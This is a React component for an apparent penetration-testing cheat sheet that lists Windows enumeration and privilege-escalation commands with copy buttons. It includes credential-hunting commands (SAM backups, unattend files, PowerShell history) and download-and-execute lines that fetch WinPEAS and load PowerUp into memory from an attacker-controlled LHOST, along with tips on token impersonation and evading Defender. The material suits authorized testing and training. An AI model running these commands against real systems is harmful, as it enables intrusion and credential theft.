import React, { useState } from 'react';
import { Monitor, Users, ShieldAlert, Network, FileSearch, Terminal, Key } from 'lucide-react';
import { CopyButton } from '../../CopyButtons';
import { ToolPageHeader, SectionCard, CommandListSection, TipsSection } from '../ui';

// ─── Props ────────────────────────────────────────────────────────
interface WindowsEnumProps {
    lhost: string;
    rhost: string;
}

// ─── Types ───────────────────────────────────────────────────────
interface EnumCategory {
    id: string;
    label: string;
    icon: React.ReactNode;
    commands: { label: string; cmd: string; note: string }[];
}

// ─── Windows Enum Database (Static) ───────────────────────────────
const ENUM_DATA: EnumCategory[] = [
    {
        id: 'system',
        label: 'System & Patch Info',
        icon: <Monitor className="w-4 h-4 text-blue-400" />,
        commands: [
            { label: 'Basic System Info', cmd: 'systeminfo', note: 'OS version, architecture, and basic patch info' },
            { label: 'Get Patches (WMI)', cmd: 'wmic qfe get Caption,Description,HotFixID,InstalledOn', note: 'List installed updates and hotfixes' },
            { label: 'Architecture', cmd: 'echo %PROCESSOR_ARCHITECTURE%', note: 'Check if x86 or AMD64' },
            { label: 'Environment Vars', cmd: 'set', note: 'View all environment variables' }
        ]
    },
    {
        id: 'users',
        label: 'Users & Groups',
        icon: <Users className="w-4 h-4 text-emerald-400" />,
        commands: [
            { label: 'Current User Privs', cmd: 'whoami /all', note: 'View current user, groups, and privileges (Look for SeImpersonatePrivilege)' },
            { label: 'List Users', cmd: 'net user', note: 'List all local users' },
            { label: 'Local Admins', cmd: 'net localgroup administrators', note: 'Check who is in the local admin group' },
            { label: 'Logged in Users', cmd: 'query user', note: 'See active RDP or local sessions' }
        ]
    },
    {
        id: 'network',
        label: 'Network & Routing',
        icon: <Network className="w-4 h-4 text-cyan-400" />,
        commands: [
            { label: 'Interfaces & IPs', cmd: 'ipconfig /all', note: 'Detailed network interface info' },
            { label: 'Active Connections', cmd: 'netstat -ano', note: 'View listening ports and active connections with PIDs' },
            { label: 'ARP Table', cmd: 'arp -a', note: 'Find other hosts on the local network segment' },
            { label: 'Routing Table', cmd: 'route print', note: 'Check network routing and gateways' },
            { label: 'Firewall State', cmd: 'netsh advfirewall show currentprofile', note: 'Check if Windows Defender Firewall is active' }
        ]
    },
    {
        id: 'privesc',
        label: 'PrivEsc Quick Checks',
        icon: <ShieldAlert className="w-4 h-4 text-yellow-400" />,
        commands: [
            { label: 'Unquoted Service Paths', cmd: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"', note: 'Find services running without quotes in their binary path' },
            { label: 'AlwaysInstallElevated', cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', note: 'If 1, you can run malicious MSIs as SYSTEM' },
            { label: 'Saved Credentials', cmd: 'cmdkey /list', note: 'Check for saved Windows credentials (Runas)' },
            { label: 'Scheduled Tasks', cmd: 'schtasks /query /fo LIST /v', note: 'List all scheduled tasks' }
        ]
    },
    {
        id: 'files',
        label: 'Sensitive Files',
        icon: <FileSearch className="w-4 h-4 text-purple-400" />,
        commands: [
            { label: 'SAM & SYSTEM Backup', cmd: 'dir %SYSTEMROOT%\\repair\\SAM 2>nul & dir %SYSTEMROOT%\\System32\\config\\RegBack\\SAM 2>nul', note: 'Check for legacy registry backups' },
            { label: 'Unattended Installs', cmd: 'dir /s /b /a c:\\*unattend*.xml c:\\*sysprep*.xml c:\\*sysprep*.inf 2>nul', note: 'Search for auto-install files containing passwords' },
            { label: 'Search for Passwords', cmd: 'findstr /si password *.txt *.ini *.config *.xml', note: 'Recursively search for the word "password" in common files' },
            { label: 'PowerShell History', cmd: 'type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt', note: 'Read past PS commands for hardcoded creds' }
        ]
    }
];

const TIPS = [
    'First thing to check: `whoami /priv`. If you see `SeImpersonatePrivilege`, it\'s likely vulnerable to PrintSpoofer/JuicyPotato.',
    'Windows enumeration is noisy. If Defender is active, avoid dropping heavy executables like WinPEAS to disk right away.',
    'Always check `cmdkey /list`. If an admin saved their credentials, you can use `runas /savecred` to execute commands as them.',
    'For Unquoted Service Paths, you need write permissions to a folder in the path to drop your malicious executable.',
];

// ─── Component ────────────────────────────────────────────────────
export default function WindowsEnum({ lhost, rhost }: WindowsEnumProps) {
    const [activeTab, setActiveTab] = useState<string>('system');

    // Dinamik IP'yi burada alıyoruz
    const effectiveLhost = lhost || '10.10.X.X';

    // AUTO_TOOLS bileşen içinde tanımlanıyor ki effectiveLhost'u okuyabilsin
    const AUTO_TOOLS = [
        { label: 'WinPEAS (Bat)', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o winpeas.bat & winpeas.bat', note: 'Automated enum script (Batch version)' },
        { label: 'WinPEAS (Exe)', cmd: 'certutil.exe -urlcache -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe winpeas.exe', note: 'Download executable version via certutil' },
        { label: 'PowerUp (In-Memory)', cmd: `powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://${effectiveLhost}/PowerUp.ps1'); Invoke-AllChecks"`, note: 'Load PowerUp straight into memory (requires LHOST web server)' }
    ];

    return (
        <div className="space-y-6">
            <ToolPageHeader
                icon={Terminal}
                title="Windows"
                highlight="Enumeration"
                subtitle="LOCAL_RECON & PRIVESC_VECTORS"
                color="yellow"
            />

            {/* ── Category Tabs ── */}
            <div className="flex flex-wrap gap-2">
                {ENUM_DATA.map((cat) => (
                    <button
                        key={cat.id}
                        onClick={() => setActiveTab(cat.id)}
                        className={`flex items-center gap-2 px-4 py-2.5 rounded-xl text-xs font-bold font-mono transition-all cursor-pointer border ${activeTab === cat.id
                                ? 'bg-yellow-500/10 border-yellow-500/30 text-yellow-400 shadow-[0_0_15px_-4px_rgba(234,179,8,0.2)]'
                                : 'bg-slate-900/50 border-slate-800/50 text-slate-500 hover:text-slate-300 hover:border-slate-700'
                            }`}
                    >
                        {cat.icon}
                        {cat.label}
                    </button>
                ))}
            </div>

            {/* ── Active Category Commands ── */}
            <SectionCard className="animate-page-in">
                {ENUM_DATA.find(c => c.id === activeTab)?.commands.map((item, idx) => (
                    <div key={idx} className="bg-[#0b0f19] border border-slate-800/50 rounded-xl overflow-hidden group/cmd transition-colors hover:border-yellow-500/20">
                        <div className="bg-slate-900/80 px-4 py-2 border-b border-slate-800/60 flex items-center justify-between">
                            <span className="text-[10px] font-bold font-mono text-yellow-400/80 uppercase tracking-widest">{item.label}</span>
                            <span className="text-[10px] text-slate-500 font-mono hidden sm:block">{item.note}</span>
                        </div>
                        <div className="p-4 flex items-center justify-between gap-4">
                            <code className="text-xs font-mono text-green-400/90 break-all leading-relaxed flex-1">
                                {item.cmd}
                            </code>
                            <div className="flex-shrink-0">
                                <CopyButton text={item.cmd} />
                            </div>
                        </div>
                    </div>
                ))}
            </SectionCard>

            {/* ── Automated Tools / Downloaders ── */}
            <CommandListSection
                title="Automated Enum & Execution"
                icon={Key}
                commands={AUTO_TOOLS}
                color="purple"
                defaultOpen
            />

            {/* ── Tips ── */}
            <TipsSection title="Windows Enum Tips" tips={TIPS} color="yellow" className="mb-6" />
        </div>
    );
}